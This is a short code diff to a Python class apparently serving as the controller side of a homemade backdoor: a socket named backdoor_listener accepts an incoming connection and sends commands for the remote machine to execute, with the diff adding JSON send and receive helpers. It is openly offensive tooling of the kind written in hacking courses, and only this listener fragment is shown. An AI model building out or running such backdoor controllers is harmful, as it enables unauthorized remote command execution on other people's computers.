@@ -1,7 +1,5 @@
 import socket
-import time
-
-
+import json
 class SocketClient:
     def __init__(self, ip, port):
         backdoor_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -11,9 +9,14 @@ class SocketClient:
         print("Listening...")
         (self.connection, address) = backdoor_listener.accept()
         print("Connection OK" + str(address))
-
+    def json_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.sendall((json_data).encode())
+    def json_recv(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
     def command_execution(self, command):
-        self.connection.sendall((command).encode())
+        self.json_send(command)
         return self.connection.recv(1024)
 
     def start_listener(self):
